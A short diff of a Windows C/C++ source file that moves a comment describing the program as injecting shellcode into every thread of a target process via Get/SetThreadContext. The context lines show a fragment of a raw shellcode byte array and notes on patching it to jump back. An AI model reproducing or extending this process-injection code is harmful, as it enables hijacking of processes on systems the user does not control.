@@ -1,3 +1,8 @@
+/**
+* Injects shellcode into every thread of a process using Get/SetThreadContext.
+* Supports 32- and 64 Bit applications.
+*/
+
 #include <Windows.h>
 #include <cstdio>
 #include <tlhelp32.h>
@@ -198,10 +203,6 @@ char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\
 "\x69\x74\x54\x53\xff\xd6\x83\xC4\x4C\x9d\x61\xE9\x00\x00\x00\x00"; // removed exit process, added "add esp,0x4c" (\x83\xC4\x4C), added jmp back
 #endif
 
-/**
-* Injects shellcode into every thread of a process using Get/SetThreadContext.
-* Supports 32- and 64 Bit applications.
-*/
 int main(int argc, char* argv[])
 {
 	const char* processName;
